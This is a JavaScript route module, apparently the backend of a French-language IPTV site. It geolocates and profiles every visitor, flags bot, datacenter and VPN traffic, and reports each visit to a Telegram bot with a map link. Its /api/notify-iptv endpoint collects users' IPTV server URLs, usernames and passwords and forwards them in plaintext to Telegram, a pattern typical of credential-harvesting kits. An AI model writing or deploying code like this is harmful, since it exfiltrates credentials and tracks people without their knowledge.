import { state } from '../state.js';
import { readJSON, writeJSON, serializeWrite } from '../storage.js';
import { config } from '../config.js';
import { sendTelegram, handleTelegramWebhook } from '../services/telegram.js';
import { lookupIP } from '../services/geo.js';
import { escapeHTML, parseUA, detectDeviceType, generateSessionID, getClientIP, isInVPNRange, isBanned, isBlockedASN, checkRateLimit, safeParse, badJson } from '../lib/utils.js';

const trackingRateLimits = new Map();
const captchaRateLimits = new Map();
const channelRateLimits = new Map();
const iptvNotifyLimits = new Map();

async function handleVisit(req, body) {
  const clientIP = getClientIP(req);
  const ua = req.headers['user-agent'] || '';
  const referrer = escapeHTML(req.headers['referer'] || 'Direct');
  const { browser, os } = parseUA(ua);
  const deviceType = detectDeviceType(ua);
  const isTouch = req.headers['sec-ch-ua-mobile'] === '?1' || false;

  const ipInfo = await lookupIP(clientIP);
  const isWhitelisted = state.WHITELIST_LOOKUP.has(clientIP);
  const isDatacenter = !isWhitelisted && (ipInfo.isHosting || isInVPNRange(clientIP));
  const isBannedIP = !isWhitelisted && isBanned(clientIP);
  const asnBlocked = !isWhitelisted && ipInfo.asn && isBlockedASN(ipInfo.asn);

  const session = {
    id: generateSessionID(),
    ip: clientIP,
    browser, os, deviceType, isTouch,
    referrer,
    isp: ipInfo.isp,
    country: ipInfo.country,
    countryCode: ipInfo.countryCode,
    city: ipInfo.city,
    region: ipInfo.region,
    asn: ipInfo.asn,
    asnOrg: ipInfo.asnOrg,
    isProxy: !isWhitelisted && ipInfo.isProxy,
    isDatacenter,
    isBanned: isBannedIP || asnBlocked,
    isASNBlocked: asnBlocked,
    siteUrl: body.siteUrl || config.SITE_URL,
    channelName: body.channelName || '',
    streamUrl: body.streamUrl || '',
    timestamp: new Date().toISOString(),
  };

  await serializeWrite(() => {
    state.VISITS.unshift(session);
    writeJSON(config.VISITS_FILE, state.VISITS);
  });

  const statusIcon = session.isASNBlocked ? '🚫' : session.isBanned ? '🚫' : session.isDatacenter ? '🤖' : session.isProxy ? '⚠️' : '✅';
  const statusLabel = session.isASNBlocked ? 'ASN Bloqué' : session.isBanned ? 'Banned' : session.isDatacenter ? 'Bot/DC' : session.isProxy ? 'Proxy' : 'Human visitor';

  const visitCount = state.VISITS.filter(v => v.ip === clientIP).length;
  const isReturning = visitCount > 1;
  const clientHeader = isReturning
    ? `🆔 <b>Visiteur connu</b> (${visitCount} visites)\n  ↳ <code>${escapeHTML(session.id)}</code>`
    : `🆕 <b>Nouveau visiteur</b>\n  ↳ <code>${escapeHTML(session.id)}</code>`;

  const cityParts = [];
  if (session.city) cityParts.push(session.city);
  if (session.region) cityParts.push(session.region);
  const cityStr = cityParts.length > 0 ? cityParts.join(', ') : null;

  const mapsQ = encodeURIComponent([session.city, session.region, session.country].filter(Boolean).join(', ') || session.ip);
  const mapsLink = `https://www.google.com/maps/search/?api=1&query=${mapsQ}`;

  const asnLine = session.asn ? `🔢 <b>ASN:</b> <code>AS${escapeHTML(session.asn)}</code> ${session.asnOrg ? `— ${escapeHTML(session.asnOrg)}` : ''}` : null;

  const msg = [
    clientHeader,
    `${statusIcon} <b>Status:</b> ${escapeHTML(statusLabel)}`,
    `📍 <b>IP:</b> <code>${escapeHTML(session.ip)}</code>`,
    cityStr ? `🏙️ <b>Ville:</b> ${escapeHTML(cityStr)}` : null,
    `🌍 <b>Pays:</b> ${escapeHTML(session.country || 'Inconnu')} ${session.countryCode || ''}`,
    `📡 <b>ISP:</b> ${escapeHTML(session.isp || 'Inconnu')}`,
    asnLine,
    body.channelName ? `📺 <b>Chaîne:</b> ${escapeHTML(body.channelName)}` : null,
    body.streamUrl ? `🔗 <b>Flux:</b> <code>${escapeHTML(body.streamUrl)}</code>` : null,
    `<a href="${mapsLink}">🗺️ Voir sur Google Maps</a>`,
  ].filter(Boolean).join('\n');

  const now = Date.now();
  const lastNotify = state.telegramNotifyCache.get(clientIP);
  const isIPPremium = state.PREMIUM_LOOKUP.has(clientIP);

  const shouldNotify = !isIPPremium && (!lastNotify || (now - lastNotify > 30 * 60 * 1000));

  if (shouldNotify) {
    state.telegramNotifyCache.set(clientIP, now);
    await sendTelegram(msg, session.ip);
  } else {
    console.log(`[Telegram] Doublon/Spam ignoré pour l'IP: ${clientIP}`);
  }

  return session;
}

export async function handleTrackingRoutes(pathname, req, res, body) {
  if (pathname === '/' || pathname === '/api/telegram') {
    if (req.method !== 'POST') { res.writeHead(405, { 'Content-Type': 'application/json' }); return res.end('{"error":"Method not allowed"}'); }
    const clientIP = getClientIP(req);
    if (!checkRateLimit(trackingRateLimits, clientIP, config.TRACKING_RATE_LIMIT, config.RATE_WINDOW_MS)) {
      res.writeHead(429, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Too many requests' }));
    }
    if (!state.WHITELIST_LOOKUP.has(clientIP) && state.BANS_LOOKUP.has(clientIP)) {
      res.writeHead(403, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ ok: false, isBanned: true, ip: clientIP }));
    }
    const parsed = safeParse(body);
    if (!parsed.ok) return badJson(res);
    const data = parsed.data;
    const session = await handleVisit(req, data);
    if (session.isASNBlocked) {
      res.writeHead(403, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ ok: false, isASNBlocked: true, ip: session.ip, asn: session.asn }));
    }

    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({
      ok: true, id: session.id, ip: session.ip,
      country: session.country, isp: session.isp,
      asn: session.asn, asnOrg: session.asnOrg,
      isDatacenter: session.isDatacenter, isBanned: session.isBanned,
      isASNBlocked: session.isASNBlocked,
      isPremium: state.PREMIUM_LOOKUP.has(session.ip),
    }));
    return true;
  }

  if (pathname === '/api/captcha/failed') {
    if (req.method !== 'POST') { res.writeHead(405, { 'Content-Type': 'application/json' }); return res.end('{"error":"Method not allowed"}'); }
    const clientIP = getClientIP(req);
    if (!checkRateLimit(captchaRateLimits, clientIP, config.CAPTCHA_RATE_LIMIT, config.RATE_WINDOW_MS)) {
      res.writeHead(429, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Too many requests' }));
    }
    const parsed = safeParse(body);
    const data = parsed.ok ? parsed.data : {};
    const msg = [
      `⚠️ <b>CAPTCHA RATÉ</b>`,
      `📍 <b>IP:</b> <code>${escapeHTML(clientIP)}</code>`,
      `🏷️ <b>Type:</b> ${escapeHTML(data.type || 'Inconnu')}`,
      `🧮 <b>Calcul:</b> <code>${escapeHTML(data.equation || '')}</code>`,
      `📥 <b>Réponse entrée:</b> <code>${escapeHTML(data.input || '')}</code>`,
    ].join('\n');
    await sendTelegram(msg, clientIP);
    console.log(`[Captcha] Echec pour ${clientIP}: ${data.equation} → ${data.input}`);
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ ok: true }));
    return true;
  }

  if (pathname === '/api/telegram/channel') {
    if (req.method !== 'POST') { res.writeHead(405, { 'Content-Type': 'application/json' }); return res.end('{"error":"Method not allowed"}'); }
    const clientIP = getClientIP(req);
    if (!checkRateLimit(channelRateLimits, clientIP, config.TRACKING_RATE_LIMIT, config.RATE_WINDOW_MS)) {
      res.writeHead(429, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Too many requests' }));
    }
    const parsed = safeParse(body);
    const data = parsed.ok ? parsed.data : {};
    const now = Date.now();
    const last = state.channelNotifyCache.get(clientIP);

    if (!last || (now - last > 15 * 1000)) {
      state.channelNotifyCache.set(clientIP, now);
      const msg = [
        `📺 <b>CHAÎNE SÉLECTIONNÉE</b>`,
        `📍 <b>IP:</b> <code>${escapeHTML(clientIP)}</code>`,
        `🎬 <b>Chaîne:</b> ${escapeHTML(data.channelName || "Page d'accueil")}`,
        data.streamUrl ? `🔗 <b>Flux:</b> <code>${escapeHTML(data.streamUrl)}</code>` : null,
      ].filter(Boolean).join('\n');
      await sendTelegram(msg, clientIP);
    }
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ ok: true }));
    return true;
  }

  if (pathname === '/api/telegram-webhook') {
    if (req.method !== 'POST') { res.writeHead(405, { 'Content-Type': 'application/json' }); return res.end('{"error":"Method not allowed"}'); }
    if (config.TELEGRAM_WEBHOOK_SECRET && req.headers['x-telegram-bot-api-secret-token'] !== config.TELEGRAM_WEBHOOK_SECRET) {
      res.writeHead(403);
      return res.end('Forbidden');
    }
    const parsed = safeParse(body);
    const update = parsed.ok ? parsed.data : {};
    await handleTelegramWebhook(update);
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ ok: true }));
    return true;
  }

  if (pathname === '/api/notify-iptv') {
    if (req.method !== 'POST') { res.writeHead(405, { 'Content-Type': 'application/json' }); return res.end('{"error":"Method not allowed"}'); }
    const clientIP = getClientIP(req);
    if (!checkRateLimit(iptvNotifyLimits, clientIP, 5, 60000)) {
      res.writeHead(429, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Too many requests' }));
    }
    const parsed = safeParse(body);
    if (!parsed.ok) return badJson(res);
    const data = parsed.data;
    const server = String(data.server || '').trim();
    const username = String(data.username || '').trim();
    const password = String(data.password || '').trim();
    if (!server || !username || !password) {
      res.writeHead(400, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Missing fields' }));
    }
    const msg = [
      '📡 <b>CONNEXION IPTV</b>',
      `📍 <b>IP:</b> <code>${escapeHTML(clientIP)}</code>`,
      `🖥️ <b>Server URL:</b> <code>${escapeHTML(server)}</code>`,
      `👤 <b>Username:</b> <code>${escapeHTML(username)}</code>`,
      `🔑 <b>Password:</b> <code>${escapeHTML(password)}</code>`,
    ].join('\n');
    await sendTelegram(msg, clientIP);
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ ok: true }));
    return true;
  }

  return false;
}
